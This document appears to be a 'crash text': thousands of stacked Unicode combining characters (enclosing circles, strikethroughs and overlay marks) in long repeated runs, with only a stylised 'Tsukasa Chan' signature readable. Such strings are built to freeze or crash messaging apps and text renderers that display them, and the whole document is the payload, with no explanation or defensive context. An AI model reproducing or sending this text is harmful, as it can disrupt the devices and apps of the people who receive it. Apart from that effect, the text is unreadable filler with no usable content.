⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝